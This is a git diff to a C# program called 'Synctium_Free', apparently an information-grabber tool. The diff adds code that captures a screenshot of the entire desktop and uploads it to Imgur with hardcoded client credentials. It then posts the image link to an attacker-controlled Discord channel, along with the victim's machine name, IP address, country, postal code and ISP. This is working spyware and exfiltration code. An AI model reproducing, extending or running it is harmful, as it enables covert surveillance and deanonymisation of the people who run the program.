@@ -8,15 +8,24 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Web;
 using System.Web.Script.Serialization;
+using System.Drawing;
+using System.IO;
+using Imgur.API;
+using System.Diagnostics;
+using Imgur.API.Endpoints.Impl;
+using Imgur.API.Authentication.Impl;
+using Imgur.API.Models;
+using System.Windows.Forms;
 
 namespace Synctium_Free
 {
     class Program
     {
+        #region Public Strings
         public static string invite;
         public static string channelid;
         public static string empty = string.Empty;
-        public static string token = "Your Token here";
+        public static string token = "Your Token Here";
         public static string Machine_Name = string.Empty;
         public static string Country = string.Empty;
         public static string IP = string.Empty;
@@ -24,13 +33,10 @@ namespace Synctium_Free
         public static string RealRegion = string.Empty;
         public static string Org = string.Empty;
         public static string City = string.Empty;
-        public static string Postal = string.Empty;
-
-
-
-
-
-
+        public static string Postal;
+        public static string ImgLink;
+        #endregion
+        #region Grab_Information
         public class IpInfo
         {
             public string Country { get; set; }
@@ -58,6 +64,8 @@ namespace Synctium_Free
             [JsonProperty("postal")]
             public string Postal { get; set; }
         }
+        #endregion
+        #region Main
         static void Main(string[] args)
         {
             Console.ForegroundColor = ConsoleColor.Red;
@@ -77,8 +85,11 @@ namespace Synctium_Free
 
             Get_Information();
         }
+        #endregion
+        #region Get_Information
         private static void Get_Information()
         {
+            CaptureDesktop();
             Machine_Name = System.Environment.MachineName;
             IpInfo ipInfo = new IpInfo();
 
@@ -93,6 +104,8 @@ namespace Synctium_Free
             Org = (ipInfo.Org);
             City = (ipInfo.City);
             Postal = (ipInfo.Postal);
+
+            //Needs fix
             if (Postal == empty)
             {
                 Postal = "Not found.";
@@ -124,20 +137,73 @@ namespace Synctium_Free
             Console.WriteLine("-------------------------------------------------------------------------------------------");
             Console.WriteLine("Sending Informations over server.");
             Console.WriteLine("-------------------------------------------------------------------------------------------");
-
+            UploadImage();
             Send_Information();
 
 
         }
+        #endregion
+        #region Capture_Desktop
+        private static void CaptureDesktop()
+        {
+            Rectangle desktopRect = GetDesktopBounds();
 
+            Bitmap bitmap = new Bitmap(desktopRect.Width, desktopRect.Height);
+
+            using (Graphics graphics = Graphics.FromImage(bitmap))
+            {
+                graphics.CopyFromScreen(desktopRect.Location, Point.Empty, bitmap.Size);
+
+            }
+            bitmap.Save("C:/Users/Public/Documents/Capture-" + DateTime.Now.ToString("yyyy-MM-dd-h-mm-tt") + ".png");
+            Console.WriteLine("Capture complete!");
+        }
+        private static Rectangle GetDesktopBounds()
+        {
+            Rectangle result = new Rectangle();
+            foreach (Screen screen in Screen.AllScreens)
+            {
+                result = Rectangle.Union(result, screen.Bounds);
+            }
+
+            return result;
+        }
+        #endregion
+        #region Upload_Image
+        private static void UploadImage()
+        {
+            try
+            {
+                var client = new ImgurClient("1dd3edbb008eae6", "e25728a4e9c674fe22994462521984d86e0172aa");
+                var endpoint = new ImageEndpoint(client);
+                IImage image;
+                using (var fs = new FileStream(@"C:/Users/Public/Documents/Capture-" + DateTime.Now.ToString("yyyy-MM-dd-h-mm-tt") + ".png", FileMode.Open))
+                {
+                    image = endpoint.UploadImageStreamAsync(fs).GetAwaiter().GetResult();
+                }
+                Console.WriteLine("Image uploaded. Image Url: " + image.Link);
+                Process.Start(image.Link);
+                ImgLink = image.Link;
+                //Console.ReadKey();
+            }
+            catch (ImgurException imgurEx)
+            {
+                Console.WriteLine("An error occurred uploading an image to Imgur.");
+                Debug.Write(imgurEx.Message);
+            }
+
+
+        }
+        #endregion
+        #region Send_Information
         private static void Send_Information()
         {
-            invite = "Your Invite code (NOT URL)";
-            channelid = "Channel ID";
+            invite = "Your Invite Code (NOT URL)";
+            channelid = "Your Channel ID";
 
             Discord.funcs.joinguild(token, invite, false, null);
           
-            Discord.funcs.sendmessage(token, channelid, "**[Machine Name] - ** " + Machine_Name + "\r\n" + "**[Country] - ** " + Country + "\r\n" + "**[Postal Code] - ** " + Postal + "\r\n" + "**[ISP] - ** " + Org + "\r\n" + "**[IP Address] - ** " + IP , false, false);
+            Discord.funcs.sendmessage(token, channelid, "**[Machine Name] - ** " + Machine_Name + "\r\n" + "**[Country] - ** " + Country + "\r\n" + "**[Postal Code] - ** " + Postal + "\r\n" + "**[ISP] - ** " + Org + "\r\n" + "**[IP Address] - ** " + IP + "\r\n" + "**[Capture] - ** " + ImgLink, false, false);
             //Discord.funcs.sendmessage(token, channelid, "**[Country] - ** " + Country, false, false);
             Console.WriteLine("-------------------------------------------------------------------------------------------");
             Console.WriteLine("Sent.");
@@ -148,5 +214,6 @@ namespace Synctium_Free
 
 
         }
+        #endregion
     }
 }
